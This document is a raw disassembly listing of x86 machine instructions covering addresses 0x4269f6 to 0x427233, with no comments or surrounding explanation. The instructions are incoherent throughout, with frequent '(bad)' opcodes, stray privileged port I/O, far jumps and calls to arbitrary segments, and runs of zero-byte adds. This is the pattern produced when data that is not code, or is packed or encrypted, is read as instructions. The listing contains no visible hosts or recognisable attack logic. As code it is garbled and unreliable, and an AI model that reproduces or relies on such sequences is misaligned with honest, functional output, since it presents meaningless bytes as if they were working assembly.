  4269f6:	sub    ebp,0xefee5c82
  4269fc:	in     al,dx
  4269fd:	pushf  
  4269fe:	mul    DWORD PTR [edx-0x69e8fbfe]
  426a04:	add    ch,cl
  426a06:	push   ss
  426a07:	fs call 0x6500:0x250ba00
  426a0f:	mov    ecx,0x62a6080d
  426a14:	cli    
  426a15:	out    0xa1,eax
  426a17:	add    al,BYTE PTR [edi+0x62fb]
  426a1d:	add    BYTE PTR [eax],al
  426a1f:	add    BYTE PTR [edx],dh
  426a21:	out    0x5a,al
  426a23:	das    
  426a24:	dec    esp
  426a25:	and    eax,0x2d76e5be
  426a2a:	push   edx
  426a2b:	push   ss
  426a2c:	add    BYTE PTR [esi],cl
  426a2e:	and    al,0xd9
  426a30:	stc    
  426a31:	in     al,dx
  426a32:	(bad)  
  426a34:	add    al,BYTE PTR ss:[edi-0x65d59f]
  426a3b:	call   0xd83fa3b6
  426a40:	inc    esp
  426a41:	mov    esp,0x2b437c0
  426a46:	push   edx
  426a47:	inc    esi
  426a48:	bound  ebx,QWORD PTR [edx]
  426a4a:	push   cs
  426a4b:	test   eax,0x7d357d76
  426a50:	add    eax,DWORD PTR [edx+0x0]
  426a53:	inc    ecx
  426a54:	jae    0x426a95
  426a56:	add    cl,ch
  426a58:	cmc    
  426a59:	daa    
  426a5a:	mov    ah,0x37
  426a5c:	mov    ah,0x2
  426a5e:	add    dl,bl
  426a60:	ss aad 0x61
  426a63:	dec    edx
  426a64:	lds    edx,FWORD PTR [edi+edi*1-0x17]
  426a68:	jmp    0xb71d8684
  426a6d:	add    ch,cl
  426a6f:	dec    edi
  426a70:	jno    0x426a74
  426a72:	add    BYTE PTR [edx+0x2ad2425e],bl
  426a78:	jno    0x426af7
  426a7a:	adc    eax,0x41e701
  426a7f:	out    0x41,al
  426a81:	pop    ds
  426a82:	mov    esp,0xb7
  426a87:	add    BYTE PTR [eax],al
  426a89:	xor    eax,0x13ffff02
  426a8e:	shl    BYTE PTR [ebx+0x33069fd6],1
  426a94:	fisttp QWORD PTR [edx-0x242f46c5]
  426a9a:	add    eax,0x5295e800
  426a9f:	sti    
  426aa0:	call   FWORD PTR [eax]
  426aa2:	inc    ebp
  426aa3:	je     0x426b13
  426aa5:	xchg   ebx,eax
  426aa6:	(bad)  
  426aa7:	or     al,0xbc
  426aa9:	jmp    0xbe5a:0xc98affc2
  426ab0:	sub    eax,esp
  426ab2:	add    BYTE PTR [eax+eax*1],dl
  426ab5:	cmp    eax,0x8c43cdd9
  426aba:	xor    ecx,DWORD PTR [ebp+0x5034c40c]
  426ac0:	call   0x3dbaf4
  426ac5:	pop    edi
  426ac6:	js     0x426a77
  426ac8:	(bad)  
  426ac9:	syscall 
  426acb:	lea    eax,[ebx+esi*2]
  426ace:	div    DWORD PTR ss:[eax+edi*2+0x6e]
  426ad3:	dec    ebp
  426ad4:	call   0x3dbb1c
  426ad9:	cmp    bh,ah
  426adb:	sub    al,0xbc
  426add:	jp     0x426aa1
  426adf:	(bad)  
  426ae0:	jmp    0x5574:0x1b0c004d
  426ae7:	aaa    
  426ae8:	add    BYTE PTR [ecx+ecx*4],cl
  426aeb:	shl    BYTE PTR [eax+eax*1+0x0],0x0
  426af0:	add    BYTE PTR [eax],al
  426af2:	sub    edx,edi
  426af4:	or     al,0xb4
  426af6:	push   0xffffffc2
  426af8:	dec    DWORD PTR [eax+ebx*1+0x4b0f4b4e]
  426aff:	or     BYTE PTR [esi+edx*8+0x74f7064f],bh
  426b06:	js     0x426b76
  426b08:	mov    WORD PTR [esi*2+0x71e8342a],es
  426b0f:	push   cs
  426b10:	add    al,0x0
  426b12:	push   ebx
  426b13:	bnd call 0x46e16d4
  426b19:	push   0x43a0b5
  426b1e:	ret    0xe355
  426b21:	or     eax,0x5b2a6b35
  426b26:	push   ebx
  426b27:	ds ret 0x7504
  426b2b:	inc    ecx
  426b2c:	inc    esi
  426b2d:	ror    bl,0x2b
  426b30:	add    al,0x52
  426b32:	call   0x1d6b:0x350de75d
  426b39:	adc    al,0x2d
  426b3b:	clc    
  426b3c:	shr    BYTE PTR [edi+0x62042bab],1
  426b42:	(bad)  
  426b43:	mov    ds:0xd1753fae,al
  426b48:	ins    DWORD PTR es:[edi],dx
  426b49:	cmp    al,0x75
  426b4b:	imul   edx,edx,0xdba59cbf
  426b51:	pop    es
  426b52:	loope  0x426bca
  426b54:	xchg   BYTE PTR [eax+eax*1+0x0],dh
  426b58:	add    BYTE PTR [eax],al
  426b5a:	add    BYTE PTR [ecx+0x3d7f2f71],bl
  426b60:	cmp    DWORD PTR [ebp+edx*4+0x51ff6997],ebx
  426b67:	push   ss
  426b68:	fisubr DWORD PTR [ebp-0xedf8ac1]
  426b6e:	sbb    eax,DWORD PTR [edi+0x3759ffa9]
  426b74:	call   WORD PTR [esi+ebp*8+0x15]
  426b79:	and    esp,0xd
  426b7c:	jmp    0x426b15
  426b7e:	je     0x426bf6
  426b80:	imul   edi,edi,0x7a98ab4e
  426b86:	jge    0x426bf5
  426b88:	add    ch,BYTE PTR [edx+ecx*4+0x7e]
  426b8c:	xchg   BYTE PTR [edx],bl
  426b8e:	add    eax,0x85c10275
  426b93:	pop    ss
  426b94:	add    ebp,ecx
  426b96:	jg     0x426b4d
  426b98:	(bad)  
  426b9a:	aad    0x75
  426b9c:	add    ch,cl
  426b9e:	jle    0x426bd6
  426ba0:	push   es
  426ba1:	hlt    
  426ba2:	add    al,0xc3
  426ba4:	jg     0x426b8f
  426ba6:	cli    
  426ba7:	icebp  
  426ba8:	mov    bl,0xe9
  426baa:	add    esi,DWORD PTR [ebp-0x16]
  426bad:	test   al,0xb1
  426baf:	push   0x2
  426bb1:	xchg   edx,eax
  426bb2:	lock mov dl,BYTE PTR [ecx+ebp*1]
  426bb6:	add    al,0x17
  426bb8:	add    esp,0x4b
  426bbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426bbc:	ret    
  426bbd:	call   0x426bc5
  426bc2:	add    BYTE PTR [eax],al
  426bc4:	jle    0x426b4e
  426bc6:	add    esi,DWORD PTR fs:[ebp+0x2]
  426bca:	xor    DWORD PTR [edx+0x21e9027e],ecx
  426bd0:	je     0x426bd7
  426bd2:	mov    eax,ds:0x6402aab1
  426bd7:	setns  BYTE PTR [esi]
  426bda:	xchg   ecx,eax
  426bdb:	ins    DWORD PTR es:[edi],dx
  426bdc:	jne    0x426be0
  426bde:	jmp    0x3a87127e
  426be3:	mov    dh,dl
  426be5:	inc    edi
  426be6:	cdq    
  426be7:	fwait
  426be8:	cli    
  426be9:	lock call 0xcd0857f2
  426bef:	idiv   ecx
  426bf1:	inc    ecx
  426bf2:	xchg   ebp,eax
  426bf3:	es clc 
  426bf5:	cmc    
  426bf6:	int3   
  426bf7:	(bad)  
  426bf8:	jmp    0xc06a:0x7503e999
  426bff:	lds    ecx,FWORD PTR [esi]
  426c01:	jg     0x426c6f
  426c03:	sqrtps xmm2,XMMWORD PTR [edx]
  426c06:	add    BYTE PTR [ecx],dh
  426c08:	xchg   ecx,eax
  426c09:	add    al,BYTE PTR [eax]
  426c0b:	jmp    0xe70092ee
  426c10:	cld    
  426c11:	mov    al,ds:0x230b7b0
  426c16:	test   DWORD PTR [ecx-0x26797f7b],ebp
  426c1c:	in     al,dx
  426c1d:	adc    al,0x18
  426c1f:	fidiv  DWORD PTR [esi]
  426c21:	add    dl,BYTE PTR [eax-0x42]
  426c24:	mov    edx,0x2ade92
  426c29:	add    BYTE PTR [eax],al
  426c2b:	add    BYTE PTR [eax],al
  426c2d:	jns    0x426bbc
  426c2f:	inc    esp
  426c30:	add    eax,0x624fd435
  426c35:	jne    0x426c38
  426c37:	add    cl,ch
  426c39:	and    edi,DWORD PTR [esi+0x2766124]
  426c3f:	add    BYTE PTR [ecx-0x16ffd7fe],al
  426c45:	adc    esi,esi
  426c47:	and    ebx,ebp
  426c49:	icebp  
  426c4a:	inc    ebp
  426c4b:	adc    BYTE PTR [edx-0x4c],ah
  426c4e:	shl    edi,1
  426c50:	mov    bl,0x2b
  426c52:	add    al,BYTE PTR [eax]
  426c54:	jb     0x426ccd
  426c56:	sar    dl,1
  426c58:	mov    ecx,0xe17d856e
  426c5d:	jle    0x426ca1
  426c5f:	shr    BYTE PTR [edx-0x1aea868a],cl
  426c65:	dec    eax
  426c66:	add    BYTE PTR ds:[edx+0x66],dl
  426c6a:	aas    
  426c6b:	add    al,ch
  426c6d:	jbe    0x426c71
  426c6f:	jne    0x426c34
  426c71:	icebp  
  426c72:	stc    
  426c73:	pop    es
  426c74:	add    al,BYTE PTR [ebp+0x4aa58ce6]
  426c7a:	test   BYTE PTR [edi+0x16],0x12
  426c7e:	add    dl,BYTE PTR [ecx+ebp*4]
  426c81:	jbe    0x426c0a
  426c83:	rol    BYTE PTR [eax],0x90
  426c86:	sub    al,0x62
  426c88:	add    dh,ah
  426c8a:	js     0x426c18
  426c8c:	inc    esp
  426c8d:	xor    BYTE PTR [edx+0x4b],ch
  426c90:	lea    eax,[eax]
  426c92:	add    BYTE PTR [eax],al
  426c94:	add    BYTE PTR [eax],al
  426c96:	nop
  426c97:	bound  edi,QWORD PTR [edi+0x0]
  426c9a:	fadd   QWORD PTR [ecx]
  426c9c:	push   eax
  426c9d:	ud2    
  426c9f:	ret    
  426ca0:	add    eax,0x1cb25
  426ca5:	add    BYTE PTR [ebx+ecx*4+0x6cbb086f],bl
  426cac:	das    
  426cad:	adc    al,0x9c
  426caf:	push   es
  426cb0:	test   eax,eax
  426cb2:	mov    dl,BYTE PTR [ebp+0x7a]
  426cb5:	clc    
  426cb6:	int    0xc
  426cb8:	or     eax,0x37e5b83
  426cbd:	jne    0x426c64
  426cbf:	sbb    DWORD PTR [eax],eax
  426cc1:	mov    ecx,DWORD PTR [esi+eax*1-0x1d]
  426cc5:	push   ss
  426cc6:	imul   edi,DWORD PTR [esi+0x61],0xffffff83
  426cca:	js     0x426d2e
  426ccc:	or     esp,DWORD PTR [eax]
  426cce:	mov    ?,WORD PTR [eax+0x2a]
  426cd1:	leave  
  426cd2:	jb     0x426ccd
  426cd4:	dec    ebx
  426cd5:	inc    esp
  426cd6:	pushf  
  426cd7:	hlt    
  426cd8:	inc    ebx
  426cd9:	and    al,0x6c
  426cdb:	xor    eax,ebp
  426cdd:	imul   ecx,ecx,0xffffff8a
  426ce0:	not    DWORD PTR [edi-0x35]
  426ce3:	ins    BYTE PTR es:[edi],dx
  426ce4:	stos   DWORD PTR es:[edi],eax
  426ce5:	adc    al,0xc
  426ce7:	add    DWORD PTR [edi+0x5e],edx
  426cea:	pop    ss
  426ceb:	(bad)  
  426cec:	in     al,0x5d
  426cee:	sahf   
  426cef:	jge    0x426cec
  426cf1:	push   esp
  426cf2:	xlat   BYTE PTR ds:[ebx]
  426cf3:	xchg   ebp,eax
  426cf4:	dec    esi
  426cf5:	mov    eax,DWORD PTR [ecx]
  426cf7:	jns    0x426d47
  426cf9:	push   esi
  426cfa:	add    BYTE PTR [eax],al
  426cfc:	add    BYTE PTR [eax],al
  426cfe:	add    BYTE PTR [ebx+0x6c],bl
  426d01:	(bad)  
  426d02:	adc    al,0xdc
  426d04:	add    BYTE PTR [ebx+0x1e275f8],al
  426d0a:	or     BYTE PTR ds:0x75005a6c,cl
  426d10:	out    dx,eax
  426d11:	mov    esi,0xbff07275
  426d16:	jmp    0x41d80b
  426d1b:	lock imul esi,ebx,0xffffff83
  426d1f:	imul   DWORD PTR [edx-0x1]
  426d22:	push   esi
  426d24:	pop    esp
  426d25:	add    eax,0x81e86f74
  426d2a:	or     eax,0xfa7e6661
  426d2f:	jp     0x426d6f
  426d31:	cmovg  esp,DWORD PTR [edx]
  426d34:	mov    esp,0x2b646ff1
  426d39:	add    al,0x87
  426d3b:	popf   
  426d3c:	in     eax,0xa6
  426d3e:	je     0x426d59
  426d40:	lock mov ecx,0x7e7e2148
  426d46:	call   0x7f3f8cc6
  426d4b:	lea    esp,[eax+edx*1+0x18]
  426d4f:	(bad)  
  426d50:	jg     0x426ce9
  426d52:	adc    esp,DWORD PTR [esi]
  426d54:	adc    DWORD PTR ds:0x9bf3ad7f,eax
  426d5a:	mov    ch,0x55
  426d5c:	imul   edi,edi,0xffffff86
  426d5f:	ins    DWORD PTR es:[edi],dx
  426d60:	sar    ebx,1
  426d62:	dec    esi
  426d63:	add    BYTE PTR [eax],al
  426d65:	add    BYTE PTR [eax],al
  426d67:	add    bh,bl
  426d69:	imul   edx,DWORD PTR [esi-0x8a91115],0xd8565a84
  426d73:	mov    ecx,0x3f1c35
  426d78:	mov    ds:0x6717f13c,eax
  426d7d:	test   eax,0xddf167ff
  426d82:	inc    ebx
  426d83:	add    BYTE PTR ds:0x2e883303,bl
  426d89:	jl     0x426d3d
  426d8b:	fwait
  426d8c:	sub    eax,0xc787127f
  426d91:	jnp    0x426d87
  426d93:	out    0x80,eax
  426d95:	ret    0xcae8
  426d98:	add    esi,edi
  426d9a:	loop   0x426dca
  426d9c:	or     eax,0x7503aee7
  426da1:	jnp    0x426e17
  426da3:	sti    
  426da4:	out    dx,eax
  426da5:	adc    eax,0x2aaf55d
  426daa:	ds jnp 0x426de5
  426dad:	or     dh,BYTE PTR [edx]
  426daf:	cmp    BYTE PTR es:[eax-0x1b],al
  426db3:	add    esp,DWORD PTR [esi]
  426db5:	xchg   ecx,eax
  426db7:	xor    al,0x26
  426db9:	push   0x78
  426dbb:	add    al,0x75
  426dbd:	add    ch,BYTE PTR [ebx+eax*8+0x3d]
  426dc1:	icebp  
  426dc2:	arpl   WORD PTR [ecx-0x29a0fad8],si
  426dc8:	and    al,0xc2
  426dca:	call   0x426ea1
  426dcf:	add    BYTE PTR [eax],al
  426dd1:	loop   0x426da2
  426dd3:	imul   edi,DWORD PTR [eax+eiz*1+0x901d114],0xffffffd0
  426ddb:	imul   eax,DWORD PTR [esi+0x2e410300],0x75
  426de2:	add    ebp,DWORD PTR [ecx-0x66]
  426de5:	and    al,0xba
  426de7:	out    dx,eax
  426de8:	add    esi,DWORD PTR [esi-0x7e]
  426deb:	dec    esi
  426dec:	inc    ebx
  426ded:	(bad)  
  426dee:	jnp    0x426dc5
  426df0:	fild   WORD PTR [esi-0x54792773]
  426df6:	aam    0xb1
  426df8:	shr    BYTE PTR [ebx],cl
  426dfa:	jnp    0x426dd8
  426dfc:	or     esp,DWORD PTR [edi-0x3e]
  426dff:	call   0x54a786
  426e04:	jo     0x426e72
  426e06:	add    al,BYTE PTR [ebx]
  426e08:	imul   esi,ebp,0x3ff67841
  426e0e:	inc    ecx
  426e0f:	jae    0x426e03
  426e11:	test   DWORD PTR ds:0x6430f588,eax
  426e17:	or     DWORD PTR [edx-0x1a],esp
  426e1a:	bound  eax,QWORD PTR ds:0x87391271
  426e20:	and    BYTE PTR [edi+0x78],dh
  426e23:	xchg   DWORD PTR [edx],ebp
  426e25:	push   eax
  426e26:	test   edi,edx
  426e28:	jo     0x426e1c
  426e2a:	xor    ebx,ecx
  426e2c:	pop    esp
  426e2d:	out    dx,eax
  426e2e:	or     DWORD PTR [ebp+eax*1-0x23],0xffffff85
  426e33:	leave  
  426e34:	pop    ebp
  426e35:	add    BYTE PTR [eax],al
  426e37:	add    BYTE PTR [eax],al
  426e39:	add    BYTE PTR [edi-0x77],dh
  426e3c:	cmp    DWORD PTR [edx],esi
  426e3e:	cwde   
  426e3f:	mov    esp,0xcf85e908
  426e44:	xchg   cl,al
  426e46:	xchg   bh,cl
  426e48:	out    0x4,eax
  426e4a:	jbe    0x426e4e
  426e4c:	add    dl,bh
  426e4e:	fnsave [edx]
  426e50:	mov    edi,0xcf338225
  426e55:	adc    al,0xa2
  426e57:	mov    ah,0x58
  426e59:	sbb    eax,0xa92f0231
  426e5e:	mov    esp,0x68de7543
  426e63:	cmp    DWORD PTR [esi],edx
  426e65:	cmc    
  426e66:	dec    ecx
  426e67:	xor    esi,edi
  426e69:	cld    
  426e6a:	jns    0x426e1e
  426e6c:	push   ebx
  426e6d:	jmp    0xb82968e3
  426e72:	mov    esi,0xf6e5fff0
  426e77:	popa   
  426e78:	cmp    eax,0x23eef1bf
  426e7d:	cmc    
  426e7e:	retf   
  426e7f:	repz cli 
  426e81:	add    dh,ch
  426e83:	daa    
  426e84:	dec    edi
  426e85:	jmp    FWORD PTR [ecx]
  426e87:	or     cl,BYTE PTR [esi]
  426e89:	inc    eax
  426e8a:	dec    esp
  426e8b:	add    esp,0x10
  426e8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e8f:	or     al,0x0
  426e91:	pop    es
  426e92:	pushf  
  426e93:	stc    
  426e94:	mov    edi,0xc14b2678
  426e99:	ja     0x426ea5
  426e9b:	or     bh,dh
  426e9d:	mov    al,BYTE PTR [eax]
  426e9f:	add    BYTE PTR [eax],al
  426ea1:	add    BYTE PTR [eax],al
  426ea3:	ins    BYTE PTR es:[edi],dx
  426ea4:	fwait
  426ea5:	or     BYTE PTR [ebx+0x66bb5355],cl
  426eab:	test   DWORD PTR [edx],eax
  426ead:	outs   dx,DWORD PTR ds:[esi]
  426eae:	(bad)  
  426eaf:	rol    BYTE PTR [esi],0x83
  426eb2:	ret    
  426eb3:	add    bh,cl
  426eb5:	sar    BYTE PTR [ecx-0x28],cl
  426eb8:	dec    edx
  426eb9:	fdiv   DWORD PTR [ebp-0x1a]
  426ebc:	cli    
  426ebd:	dec    ebx
  426ebe:	and    al,0xd0
  426ec0:	clc    
  426ec1:	enter  0xde74,0xfc
  426ec5:	cmp    BYTE PTR [edi-0x69],bl
  426ec8:	inc    esp
  426ec9:	or     BYTE PTR [eax],al
  426ecb:	pop    ecx
  426ecc:	mov    esp,0x7e443274
  426ed1:	idiv   edi
  426ed3:	arpl   WORD PTR [edi],sp
  426ed5:	adc    eax,0xffffffcf
  426ed8:	jle    0x426e5a
  426eda:	cmp    DWORD PTR [ecx+ecx*1+0x9564104],ecx
  426ee1:	out    dx,eax
  426ee2:	test   esi,ecx
  426ee4:	or     BYTE PTR ds:0xfefe6bbf,al
  426eea:	jg     0x426f05
  426eec:	xchg   DWORD PTR [ebp+ecx*1+0x9],esi
  426ef0:	jle    0x426f6a
  426ef2:	push   es
  426ef3:	aaa    
  426ef4:	inc    ebx
  426ef5:	mov    DWORD PTR [esi],eax
  426ef7:	mov    DWORD PTR [edx],0xfa4c267b
  426efd:	mov    esi,0xf9c4755f
  426f02:	mov    bh,0xaa
  426f04:	imul   edi,esp,0x7f
  426f07:	add    BYTE PTR [eax],al
  426f09:	add    BYTE PTR [eax],al
  426f0b:	add    al,dh
  426f0d:	sub    al,BYTE PTR [esi]
  426f0f:	add    edi,eax
  426f11:	xor    BYTE PTR [ebx],cl
  426f13:	push   edi
  426f15:	or     BYTE PTR [edi+edi*4],al
  426f18:	clc    
  426f19:	and    DWORD PTR [ebx],ecx
  426f1b:	xor    al,0xed
  426f1d:	pop    ds
  426f1e:	test   bl,bh
  426f20:	mov    ds:0x66d078b0,al
  426f25:	adc    BYTE PTR ds:0xfd8f4c39,bl
  426f2b:	jle    0x426f61
  426f2d:	ins    DWORD PTR es:[edi],dx
  426f2e:	cmp    DWORD PTR [ebp+0x8],esi
  426f31:	fidiv  WORD PTR [eax+0x2c307075]
  426f37:	add    BYTE PTR [edx-0x15],bh
  426f3a:	jns    0x426f2e
  426f3c:	popa   
  426f3d:	outs   dx,BYTE PTR ds:[esi]
  426f3e:	mov    bl,bh
  426f40:	pop    ebp
  426f41:	popa   
  426f42:	sub    bh,BYTE PTR [esi-0x959714]
  426f48:	test   DWORD PTR [eax],0x1fb28704
  426f4e:	imul   eax,DWORD PTR ds:0x3040ffd,0xfffffff5
  426f55:	in     eax,0x43
  426f57:	jns    0x426fd3
  426f59:	fidiv  WORD PTR [ebp+0x74]
  426f5c:	jbe    0x426f4a
  426f5e:	and    eax,0x3f5bb600
  426f63:	aaa    
  426f64:	lods   eax,DWORD PTR ds:[esi]
  426f65:	push   ss
  426f66:	push   cs
  426f67:	or     DWORD PTR [eax+ecx*4+0x7f],0x97d0afb
  426f6f:	mov    eax,0x0
  426f74:	add    BYTE PTR [edx],ch
  426f76:	imul   eax,DWORD PTR [esi],0xffffff80
  426f79:	mov    dh,0xb1
  426f7b:	add    eax,0x2a08175
  426f80:	pop    eax
  426f81:	loope  0x426f85
  426f83:	test   eax,0xd54aaa03
  426f88:	add    eax,0x372601ec
  426f8d:	xor    eax,0x7127a53a
  426f92:	in     eax,dx
  426f93:	jmp    0x70f8:0xf11eb93c
  426f9a:	xor    DWORD PTR [ebp+0x2a777d27],0xebf0ae83
  426fa4:	mov    ebx,0x83e202c6
  426fa9:	fisttp DWORD PTR [edx]
  426fab:	jmp    0x7f121486
  426fb0:	xor    eax,0x43b674f2
  426fb5:	push   edx
  426fb6:	pop    ebx
  426fb7:	call   0xee50:0x5a86042e
  426fbe:	ja     0x42702a
  426fc0:	mov    BYTE PTR [ebx-0x76720d12],bh
  426fc6:	or     BYTE PTR [ebp+0x55],ah
  426fc9:	popa   
  426fca:	jmp    DWORD PTR [eax+0x14]
  426fcd:	xor    al,0xc3
  426fcf:	sbb    ecx,edi
  426fd1:	sar    BYTE PTR [ebp-0x3e],cl
  426fd4:	clc    
  426fd5:	ja     0x426fa0
  426fd7:	sub    eax,0xbc
  426fdc:	add    BYTE PTR [eax],al
  426fde:	inc    ebx
  426fdf:	add    ch,dl
  426fe1:	xor    DWORD PTR [edi+0x398ee901],0x1e
  426fe8:	stc    
  426fe9:	mov    BYTE PTR [esi+ebp*8-0x2883731a],ch
  426ff0:	xor    bl,bh
  426ff2:	sar    dh,1
  426ff4:	call   0x18a963d1
  426ff9:	xchg   DWORD PTR [eax],ebx
  426ffb:	jbe    0x426fe6
  426ffd:	(bad)  
  426ffe:	and    al,0x8b
  427000:	add    BYTE PTR [ebx-0x55],bh
  427003:	dec    edi
  427004:	test   DWORD PTR [edi+0x62],esi
  427007:	sbb    BYTE PTR [ebx+0x72],dl
  42700a:	jne    0x427012
  42700c:	daa    
  42700d:	pusha  
  42700e:	in     eax,dx
  42700f:	inc    ecx
  427010:	je     0x42700f
  427012:	addr16 mov bl,0x14
  427015:	ficomp WORD PTR [esi+edi*2-0x32]
  427019:	mov    ebp,0xd888e473
  42701e:	repz inc eax
  427020:	(bad)  
  427021:	mov    al,ds:0x4174c93b
  427026:	pop    ss
  427027:	jle    0x42701b
  427029:	pushf  
  42702a:	jae    0x427023
  42702c:	call   0x45869c1c
  427031:	adc    eax,0x69027710
  427036:	inc    ebx
  427037:	inc    edx
  427038:	bound  esi,QWORD PTR [eax+0x79]
  42703b:	jg     0x427082
  42703d:	icebp  
  42703e:	in     eax,dx
  42703f:	inc    ecx
  427040:	je     0x42702d
  427042:	add    BYTE PTR [eax],al
  427044:	add    BYTE PTR [eax],al
  427046:	add    BYTE PTR [ecx],al
  427048:	sbb    al,BYTE PTR [edi+0x56dc6aa4]
  42704e:	mov    al,0x3b
  427050:	or     al,BYTE PTR [eax]
  427052:	xor    al,0xe8
  427054:	gs push ecx
  427056:	ins    BYTE PTR es:[edi],dx
  427057:	ds in  eax,dx
  427059:	add    ebx,DWORD PTR [edx]
  42705b:	xor    DWORD PTR [ecx-0x41],ecx
  42705e:	pop    ds
  42705f:	repnz in al,dx
  427061:	sti    
  427062:	shl    DWORD PTR [ebx],1
  427064:	jl     0x427061
  427066:	mov    dh,0x97
  427068:	jge    0x42702a
  42706a:	xor    eax,0xa6c7f772
  42706f:	cs mov bh,0x87
  427072:	and    al,0xf5
  427074:	dec    eax
  427075:	mov    edi,0x5166003c
  42707a:	fs ds in eax,dx
  42707d:	add    eax,DWORD PTR [eax]
  42707f:	mov    edi,0x62c3c8c2
  427084:	xchg   DWORD PTR [ebp-0x4],esi
  427087:	hlt    
  427088:	pop    ebx
  427089:	stc    
  42708a:	(bad)  
  42708b:	(bad)  [eax-0x7c]
  42708e:	rol    BYTE PTR [eax-0x3],0x7a
  427092:	enter  0xc9bb,0xba
  427096:	mov    esp,DWORD PTR [ecx]
  427098:	test   al,0xc3
  42709b:	add    DWORD PTR [edi+0xa01ffec],eax
  4270a1:	push   ecx
  4270a2:	call   0x39f124
  4270a7:	mov    eax,ds:0x3677be
  4270ac:	add    BYTE PTR [eax],al
  4270ae:	add    BYTE PTR [eax],al
  4270b0:	xchg   ecx,eax
  4270b1:	int3   
  4270b2:	je     0x4270b9
  4270b4:	xchg   esi,eax
  4270b5:	push   esi
  4270b6:	outs   dx,DWORD PTR ds:[esi]
  4270b7:	inc    eax
  4270b8:	or     al,0x2f
  4270ba:	sar    BYTE PTR [ecx],0xe1
  4270bd:	or     DWORD PTR [ebp+0x14],esi
  4270c0:	repnz cmp dl,bh
  4270c3:	jae    0x4270f2
  4270c5:	sti    
  4270c6:	fcomp  DWORD PTR [ebx]
  4270c8:	inc    ebp
  4270c9:	jg     0x4270ac
  4270cb:	and    ebx,DWORD PTR [ecx-0x7f]
  4270ce:	dec    edi
  4270cf:	add    bl,dl
  4270d1:	and    ebx,0x55879e12
  4270d7:	or     BYTE PTR [ecx+0x3c],cl
  4270da:	add    edx,DWORD PTR [eax-0x1c]
  4270dd:	xor    edi,0xffffffff
  4270e0:	cmp    esp,esi
  4270e2:	adc    bh,bh
  4270e4:	mov    ebx,0xd0c25d82
  4270e9:	add    DWORD PTR [ebp-0x75],edx
  4270ec:	mov    eax,0x51895150
  4270f1:	add    BYTE PTR [ebx-0x7da55bbb],0xf1
  4270f8:	bound  ecx,QWORD PTR [ecx-0x7c8af7bb]
  4270fe:	fwait
  4270ff:	cli    
  427100:	mov    al,BYTE PTR [edx+eax*4-0x74d20240]
  427107:	dec    ebp
  427108:	jns    0x4270f0
  42710a:	rol    DWORD PTR [edi],1
  42710c:	pop    ebp
  42710d:	add    edi,DWORD PTR [esi-0x5]
  427110:	push   0xffffffde
  427112:	ds js  0x427115
  427115:	add    BYTE PTR [eax],al
  427117:	add    BYTE PTR [eax],al
  427119:	test   al,0xe6
  42711b:	jg     0x427192
  42711d:	jns    0x427141
  42711f:	sti    
  427120:	sti    
  427121:	leave  
  427122:	push   ss
  427123:	lea    ecx,[ebp+0x7d]
  427126:	cmp    eax,0xec93936
  42712b:	jns    0x427107
  42712d:	pop    esi
  42712e:	sub    eax,0xde56e284
  427133:	mov    BYTE PTR [ebx+0x75],dl
  427136:	pop    esp
  427137:	jg     0x427120
  427139:	sbb    DWORD PTR [edx+esi*8],0x7
  42713d:	call   0xfe9278df
  427142:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427143:	jnp    0x4270cc
  427145:	and    ah,al
  427147:	push   eax
  427148:	call   0xfbc26e0c
  42714d:	push   cs
  42714e:	jb     0x4270d2
  427150:	sti    
  427151:	imul   esp,DWORD PTR [esi+0x34],0x10e253c9
  427158:	pop    edx
  427159:	lods   al,BYTE PTR ds:[esi]
  42715a:	test   al,0x8
  42715c:	add    dh,ch
  42715e:	sub    BYTE PTR cs:[eax+eax*1],cl
  427162:	daa    
  427163:	sub    BYTE PTR [eax],dl
  427165:	and    eax,0x7123f844
  42716a:	lock (bad) 
  42716c:	and    ebp,DWORD PTR [ecx+0x53]
  42716f:	jl     0x42716d
  427171:	mov    dl,0xab
  427173:	aas    
  427174:	xchg   DWORD PTR [ecx-0x1],eax
  427177:	jge    0x140f73b6
  42717d:	add    BYTE PTR [eax],al
  42717f:	add    BYTE PTR [eax],al
  427181:	add    BYTE PTR [ebp+0x75],al
  427184:	adc    eax,0x2d898128
  427189:	sub    BYTE PTR [ecx+0x6a],bh
  42718c:	sub    eax,DWORD PTR [eax-0x26598b82]
  427192:	repz gs sbb ch,dl
  427196:	repz cmc 
  427198:	loopne 0x42719d
  42719a:	loopne 0x427197
  42719c:	xor    bh,dl
  42719e:	(bad)  
  42719f:	std    
  4271a0:	push   0xac87ca6b
  4271a5:	adc    eax,edx
  4271a7:	push   0xffffff91
  4271a9:	jle    0x4271f9
  4271ab:	je     0x42720b
  4271ad:	pop    esp
  4271ae:	clc    
  4271af:	push   edi
  4271b0:	rol    BYTE PTR [esi],0xfd
  4271b3:	retf   
  4271b4:	call   0x95aa66bf
  4271b9:	adc    BYTE PTR [eax-0x47ba1686],0x73
  4271c0:	jmp    0xe982679a
  4271c5:	add    al,0x75
  4271c7:	add    dl,BYTE PTR [ecx+0x7f]
  4271ca:	push   cs
  4271cb:	je     0x427157
  4271cd:	cmp    bl,BYTE PTR ds:0x1d8aeaf7
  4271d3:	cmp    eax,0x85747ea4
  4271d8:	in     eax,dx
  4271d9:	sbb    al,BYTE PTR [ebp-0x7b]
  4271dc:	je     0x427259
  4271de:	int    0x53
  4271e0:	sbb    al,0x4
  4271e2:	jne    0x427262
  4271e4:	test   eax,0xf7
  4271e9:	add    BYTE PTR [eax],al
  4271eb:	mov    ds:0xf2185c73,eax
  4271f0:	int    0xf8
  4271f2:	jle    0x42723c
  4271f4:	push   es
  4271f5:	outs   dx,BYTE PTR ds:[esi]
  4271f6:	enter  0x87c2,0xae
  4271fa:	imul   esp,DWORD PTR [esi],0x76
  4271fd:	add    BYTE PTR [esi+0x68f07b2b],dh
  427203:	and    ah,ch
  427205:	(bad)  
  427206:	in     eax,dx
  427207:	imul   ch
  427209:	sbb    al,0x69
  42720b:	jne    0x427284
  42720d:	add    BYTE PTR ds:0x917577c9,bl
  427213:	push   cs
  427214:	and    eax,0x7b76e932
  427219:	ret    0x4e1f
  42721c:	dec    edx
  42721d:	mov    esi,0x76b876d9
  427222:	jmp    0x5129f4a2
  427227:	in     eax,dx
  427228:	outs   dx,DWORD PTR ds:[esi]
  427229:	jne    0x42726f
  42722b:	(bad)  
  42722c:	mov    esp,0x6b256207
  427231:	mov    ecx,esp
  427233:	xchg   DWORD PTR [edx-0x19],eax
